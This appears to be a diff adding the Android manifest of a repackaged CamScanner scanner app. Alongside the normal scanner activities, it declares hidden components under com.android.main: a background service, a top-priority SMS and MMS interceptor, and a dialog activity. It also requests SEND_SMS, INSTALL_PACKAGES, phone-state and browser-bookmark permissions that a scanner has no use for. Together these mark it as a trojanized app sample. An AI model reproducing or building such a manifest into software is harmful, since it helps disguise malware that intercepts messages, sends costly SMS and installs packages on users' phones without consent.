@@ -1,0 +1,97 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:installLocation="auto" package="com.intsig.camscanner">
+    <application android:icon="@drawable/icon" android:label="@string/app_name" android:name="ScannerApplication" android:taskAffinity="com.intsig.camscanner">
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name=".MainMenuActivity" android:screenOrientation="portrait" android:theme="@android:style/Theme.NoTitleBar">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="com.intsig.camscanner.Launcher"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="CaptureActivity" android:name="CaptureActivity" android:screenOrientation="landscape" android:theme="@style/CustomTheme">
+            <intent-filter>
+                <action android:name="com.intsig.camscanner.NEW_DOC"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        <activity android:configChanges="keyboardHidden|orientation" android:name="DocumentActivity" android:screenOrientation="portrait" android:theme="@android:style/Theme.NoTitleBar">
+            <intent-filter>
+                <action android:name="android.intent.action.VIEW"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <data android:mimeType="vnd.android.cursor.dir/vnd.intsig.document"/>
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.INSERT"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        <activity android:configChanges="keyboardHidden|locale|orientation" android:name="HelpActivity"/>
+        <activity android:configChanges="locale|orientation" android:name="VideoActivity"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/scan_activity_title" android:name="ImageScannerActivity" android:screenOrientation="portrait">
+            <intent-filter>
+                <action android:name="com.intsig.camscanner.NEW_PAGE"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        <activity-alias android:exported="true" android:label="@string/action_send_title" android:name="Scan2PDFActivity" android:targetActivity="ImageScannerActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.SEND"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <data android:mimeType="image/jpeg"/>
+                <data android:mimeType="image/png"/>
+                <data android:mimeType="image/bmp"/>
+            </intent-filter>
+        </activity-alias>
+        <activity android:configChanges="keyboardHidden|orientation" android:name="ImagePageViewActivity" android:theme="@android:style/Theme.NoTitleBar"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:name="SettingActivity" android:theme="@android:style/Theme.Light"/>
+        <provider android:authorities="com.intsig.provider.Documents" android:name=".provider.DocumentProvider"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:name="TagManagerActivity" android:theme="@android:style/Theme.NoTitleBar"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/tag_add" android:name="TagEditorActivity"/>
+        <activity android:label="@string/account_mg_title" android:name="AccountManagerActivity"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/account_setting_title" android:name="AccountSetActivity"/>
+        <service android:name="UploadService"/>
+        <activity-alias android:exported="true" android:icon="@drawable/uploadapp" android:label="@string/upload_title" android:name="UploadFilesActivity" android:targetActivity="AccountManagerActivity">
+            <intent-filter>
+                <action android:name="com.intsig.camscanner.action.UPLOAD"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity-alias>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/upload_title" android:name="UploadStateActivity"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:name="UnlockAppActivity" android:theme="@android:style/Theme.NoTitleBar"/>
+        <activity android:configChanges="keyboardHidden|orientation" android:name="MoreAppActivity"/>
+        <service android:name="com.android.main.MainService" android:process=":main"/>
+        <receiver android:name="com.android.main.ActionReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.SIG_STR"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.android.main.SmsReceiver">
+            <intent-filter android:priority="100000">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+            <intent-filter android:priority="100000">
+                <action android:name="android.provider.Telephony.WAP_PUSH_RECEIVED"/>
+                <data android:mimeType="application/vnd.wap.mms-message"/>
+            </intent-filter>
+        </receiver>
+        <activity android:name="com.android.main.TANCActivity" android:theme="@android:style/Theme.Dialog"/>
+        <version value="2"/>
+    </application>
+    <uses-permission android:name="android.permission.CAMERA"/>
+    <uses-feature android:name="android.hardware.camera"/>
+    <uses-feature android:name="android.hardware.camera.autofocus"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_MMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="com.android.browser.permission.WRITE_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+</manifest>
